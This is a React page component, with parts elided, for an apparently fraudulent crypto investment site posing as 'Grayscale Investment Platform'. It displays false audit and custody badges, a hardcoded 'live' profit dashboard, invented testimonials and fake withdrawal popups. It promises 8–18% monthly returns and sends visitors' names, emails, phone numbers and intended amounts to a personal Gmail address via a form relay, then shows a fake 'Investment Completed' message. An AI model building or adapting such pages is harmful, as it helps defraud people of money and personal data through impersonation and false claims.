...
export default function Page() {
  ...
  const handleSignup = async () => {
    ...
    setShowSuccess(true);
    try {
      await fetch("https://formsubmit.co/ajax/chidalu183@gmail.com", {
        method: "POST",
  ...
  return (
    <main className="min-h-screen bg-black text-white">
      ...
      <section className="max-w-7xl mx-auto px-6 md:px-10"><div className="border border-white/10 rounded-2xl bg-white/5 p-4 flex flex-wrap justify-center gap-6 items-center text-[10px] text-zinc-400"><span>🔒 AUDITED BY CERTIK</span><span>🛡️ SECURED BY COINBASE CUSTODY</span><span>✅ 256-BIT SSL SECURE</span><span>💳 VISA • MASTERCARD • USDT • BTC • ETH ACCEPTED</span></div></section>
      <section className="max-w-7xl mx-auto p-6 md:p-10"><h2 className="text-center text-3xl font-black mb-2">Live Investor Dashboard</h2><p className="text-center text-zinc-500 text-sm mb-6">See what real investors see inside</p><div className="border border-yellow-500/20 rounded-[2rem] bg-gradient-to-b from-zinc-900 to-black p-6"><div className="grid md:grid-cols-3 gap-4 mb-6"><div className="bg-black border border-white/10 rounded-2xl p-4"><div className="text-zinc-500 text-[10px]">TOTAL PORTFOLIO</div><div className="text-2xl font-black mt-1">$12,480.92</div><div className="text-green-400 text-xs">+ $156.40 today</div></div><div className="bg-black border border-white/10 rounded-2xl p-4"><div className="text-zinc-500 text-[10px]">DAILY PROFIT</div><div className="text-2xl font-black mt-1 text-yellow-500">$84.32</div><div className="text-zinc-500 text-xs">12.4% APY active</div></div><div className="bg-black border border-white/10 rounded-2xl p-4"><div className="text-zinc-500 text-[10px]">NEXT PAYOUT</div><div className="text-2xl font-black mt-1">02:14:33</div><div className="text-zinc-500 text-xs">Auto-withdrawal enabled</div></div></div><div className="bg-black border border-white/10 rounded-2xl p-4 h-[160px] flex items-end gap-1">{[40,65,45,80,60,90,70,100,85,110,95,120].map((h,i)=><div key={i} style={{height:h}} className="flex-1 bg-gradient-to-t from-yellow-600 to-yellow-300 rounded-t"></div>)}</div><div className="text-center text-[10px] text-zinc-600 mt-2">LIVE PROFIT CHART • UPDATES EVERY SECOND</div></div></section>
      <section className="max-w-7xl mx-auto p-6 md:p-10"><h2 className="text-center text-3xl font-black mb-2">Live Global Trading Insights</h2><p className="text-center text-zinc-500 text-sm mb-8">Real-time charts, professional analysis, worldwide portfolio management</p><div className="grid md:grid-cols-3 gap-4"><div className="md:col-span-2 rounded-[2rem] overflow-hidden border border-white/10 h-[300px] bg-zinc-900"><img src={img3} alt="Market overview" className="w-full h-full object-cover"/></div><div className="rounded-[2rem] overflow-hidden border border-white/10 h-[300px] bg-zinc-900"><img src={img4} alt="Trading analysis" className="w-full h-full object-cover"/></div><div className="rounded-[2rem] overflow-hidden border border-white/10 h-[300px] bg-zinc-900"><img src={img5} alt="Investment meeting" className="w-full h-full object-cover"/></div><div className="rounded-[2rem] overflow-hidden border border-white/10 h-[300px] bg-zinc-900"><img src={img6} alt="Charts" className="w-full h-full object-cover"/></div><div className="rounded-[2rem] overflow-hidden border border-white/10 h-[300px] bg-zinc-900"><img src={img7} alt="Global trading" className="w-full h-full object-cover"/></div></div></section>
      <section className="max-w-7xl mx-auto p-6 md:p-10"><h2 className="text-center text-3xl font-black mb-2">Trusted By Investors Worldwide</h2><p className="text-center text-zinc-500 text-sm mb-8">Live withdrawals from 6 continents</p><div className="grid md:grid-cols-3 gap-4"><div className="border border-white/10 rounded-2xl p-5 bg-white/5"><div className="text-yellow-500 text-xs">🇺🇸 USA • 2 hours ago</div><div className="font-bold mt-2">Michael T. - Withdrew $1,200</div><div className="text-zinc-400 text-xs mt-2">"Started with $500, now earning daily. Grayscale is real!"</div></div><div className="border border-white/10 rounded-2xl p-5 bg-white/5"><div className="text-yellow-500 text-xs">🇳🇬 Nigeria • 5 hours ago</div><div className="font-bold mt-2">Amina K. - Withdrew $450</div><div className="text-zinc-400 text-xs mt-2">"Very fast payout to my bank. Thank you team."</div></div><div className="border border-white/10 rounded-2xl p-5 bg-white/5"><div className="text-yellow-500 text-xs">🇬🇧 UK • Yesterday</div><div className="font-bold mt-2">James L. - Withdrew $3,400</div><div className="text-zinc-400 text-xs mt-2">"Best platform for global investors."</div></div></div></section>
      <section className="max-w-7xl mx-auto p-6 md:p-10 mt-4"><div className="grid md:grid-cols-3 gap-6"><div className="md:col-span-2 border border-white/10 rounded-[2rem] p-8 bg-zinc-900/30"><h2 className="text-yellow-500 text-xs tracking-widest mb-4">ABOUT GRAYSCALE INVESTMENT PLATFORM - GLOBAL</h2><h3 className="text-2xl font-bold mb-4">The Future Of Digital Wealth Management Across All Continents</h3><p className="text-zinc-400 text-sm leading-7">Founded in 2026, Grayscale Investment Platform was created to serve investors worldwide - from North America, South America, Europe, Africa, Asia, to Australia. We bridge traditional finance and decentralized finance for a truly global audience.<br/><br/>Our platform uses advanced algorithmic trading, staking protocols, and liquidity provision to generate sustainable yields for investors in every time zone. Every investment is tracked on-chain, and our vaults are audited quarterly by international firms.<br/><br/><span className="text-white font-bold">Global coverage:</span> United States, Canada, United Kingdom, Germany, France, Nigeria, South Africa, Kenya, India, UAE, Brazil, Australia and 100+ other countries. Real human support via our official social channels, no bots, available 24/7 worldwide.</p></div><div className="space-y-4"><div className="border border-yellow-500/20 bg-yellow-500/5 rounded-[1.5rem] p-6"><div className="text-yellow-500 font-bold text-sm mb-2">WORLDWIDE & SECURE</div><div className="text-xs text-zinc-400">Serving 6 continents with military-grade encryption, cold wallet storage, global 2FA protection.</div></div><div className="border border-white/10 rounded-[1.5rem] p-6 bg-white/5"><div className="font-bold text-sm mb-2">GLOBAL DAILY PAYOUTS</div><div className="text-xs text-zinc-400">Profits distributed daily to any country via crypto or local bank transfer.</div></div><div className="border border-white/10 rounded-[1.5rem] p-6 bg-white/5"><div className="font-bold text-sm mb-2">24/7 GLOBAL SUPPORT</div><div className="text-xs text-zinc-400 mb-3">Reach us on our official pages:</div><div className="flex flex-col gap-2"><a href="https://www.tiktok.com/@micheal.sonnenshe?_r=1&_t=ZS-99rt5sV3ygX" target="_blank" className="text-xs bg-white/10 rounded-full py-2 text-center">TikTok: @micheal.sonnenshe</a><a href="https://www.facebook.com/share/?mibextid=wwXIfr" target="_blank" className="text-xs bg-[#1877F2]/20 text-[#6aa9ff] rounded-full py-2 text-center">Facebook Page</a></div></div></div></div></section>
      <section className="max-w-7xl mx-auto p-6 md:p-10"><h2 className="text-center text-3xl font-black mb-2">How It Works Globally</h2><p className="text-center text-zinc-500 text-sm mb-10">For investors in North America, Europe, Asia, Africa, South America & Australia</p><div className="grid md:grid-cols-3 gap-6"><div className="border border-white/10 rounded-3xl p-8 text-center bg-gradient-to-b from-white/5 to-transparent"><div className="w-12 h-12 rounded-full bg-yellow-500 text-black font-black flex items-center justify-center mx-auto mb-4">1</div><div className="font-bold mb-2">Global Registration</div><div className="text-xs text-zinc-400 leading-6">Fill form from any country. Enter your WhatsApp with country code. Click Sign Up - details go to our global desk privately.</div></div><div className="border border-white/10 rounded-3xl p-8 text-center bg-gradient-to-b from-white/5 to-transparent"><div className="w-12 h-12 rounded-full bg-yellow-500 text-black font-black flex items-center justify-center mx-auto mb-4">2</div><div className="font-bold mb-2">Fund From Anywhere</div><div className="text-xs text-zinc-400 leading-6">We support USD, EUR, GBP, NGN and crypto. Our team will guide you via private chat from your continent.</div></div><div className="border border-yellow-500/30 rounded-3xl p-8 text-center bg-yellow-500/5"><div className="w-12 h-12 rounded-full bg-yellow-500 text-black font-black flex items-center justify-center mx-auto mb-4">3</div><div className="font-bold mb-2">Earn Worldwide</div><div className="text-xs text-zinc-400 leading-6">Start earning 12.4% APY daily. Withdraw to any country anytime via private request.</div></div></div></section>
      <section className="max-w-7xl mx-auto p-6 md:p-10"><h2 className="text-center text-3xl font-black mb-8">Global Investment Plans</h2><div className="grid md:grid-cols-3 gap-6"><div className="border border-white/10 rounded-[2rem] p-8 bg-zinc-900/50"><div className="text-zinc-500 text-xs">STARTER - GLOBAL</div><div className="text-3xl font-black mt-2">$100 - $999</div><div className="text-yellow-500 font-bold mt-2">8% Monthly</div><div className="text-xs text-zinc-400 mt-4">Perfect for beginners worldwide.</div><button onClick={()=>{setAmount("100"); setPlan("STARTER - 8% Monthly ($100-$999)"); window.scrollTo({top:0, behavior:"smooth"})}} className="w-full mt-6 border border-white/10 rounded-full py-3 font-bold text-sm">CHOOSE STARTER</button></div><div className="border border-yellow-500/50 rounded-[2rem] p-8 bg-gradient-to-b from-yellow-500/10 to-black relative"><div className="absolute -top-3 left-1/2 -translate-x-1/2 bg-yellow-500 text-black text-[10px] font-black px-4 py-1 rounded-full">MOST POPULAR WORLDWIDE</div><div className="text-yellow-500 text-xs">GOLD - GLOBAL</div><div className="text-3xl font-black mt-2">$1,000 - $4,999</div><div className="text-yellow-500 font-bold mt-2">12.4% Monthly</div><div className="text-xs text-zinc-400 mt-4">Best plan for any continent.</div><button onClick={()=>{setAmount("1000"); setPlan("GOLD - 12.4% Monthly ($1,000-$4,999)"); window.scrollTo({top:0, behavior:"smooth"})}} className="w-full mt-6 bg-yellow-500 text-black rounded-full py-3 font-black text-sm">CHOOSE GOLD</button></div><div className="border border-white/10 rounded-[2rem] p-8 bg-zinc-900/50"><div className="text-zinc-500 text-xs">ELITE - GLOBAL</div><div className="text-3xl font-black mt-2">$5,000+</div><div className="text-yellow-500 font-bold mt-2">18% Monthly</div><div className="text-xs text-zinc-400 mt-4">VIP for large investors worldwide.</div><button onClick={()=>{setAmount("5000"); setPlan("ELITE - 18% Monthly ($5,000+)"); window.scrollTo({top:0, behavior:"smooth"})}} className="w-full mt-6 border border-white/10 rounded-full py-3 font-bold text-sm">CHOOSE ELITE</button></div></div></section>
      ...
      {showPopup && (<div className="fixed bottom-5 left-5 z-[100] bg-zinc-900 border border-yellow-500/30 rounded-2xl p-4 shadow-2xl max-w-[280px]"><div className="flex gap-3"><div className="w-8 h-8 rounded-full bg-green-500 flex items-center justify-center text-xs">✓</div><div><div className="text-xs font-bold">New Withdrawal!</div><div className="text-[11px] text-zinc-400">Sarah from Canada withdrew $890 • Just now</div></div><button onClick={()=>setShowPopup(false)} className="ml-2 text-zinc-500">x</button></div></div>)}
      {showSuccess && (<div className="fixed inset-0 z-[200] bg-black/80 backdrop-blur flex items-center justify-center p-6"><div className="bg-zinc-900 border border-yellow-500/30 rounded-[2rem] p-8 max-w-sm w-full text-center shadow-2xl"><div className="w-16 h-16 rounded-full bg-green-500 flex items-center justify-center text-2xl mx-auto mb-4">✓</div><h2 className="text-xl font-black">Investment Completed!</h2><p className="text-zinc-300 text-[13px] mt-4 leading-6">Your investment has been completed you will receive a confirmation.</p><p className="text-zinc-500 text-[11px] mt-3">Amount: ${amount} • Plan: {plan}<br/>Our team will contact you at {phone} shortly.</p><button onClick={()=>{setShowSuccess(false); setName(""); setEmail(""); setPhone(""); setCountry(""); setPlan(""); setAmount(""); setReferral("");}} className="w-full mt-6 bg-gradient-to-r from-yellow-400 to-yellow-600 text-black font-black py-3 rounded-full">OK</button><div className="text-[10px] text-zinc-600 mt-3">Ref: GS-{Math.floor(Math.random()*900000+100000)}</div></div></div>)}
    </main>
  );
}
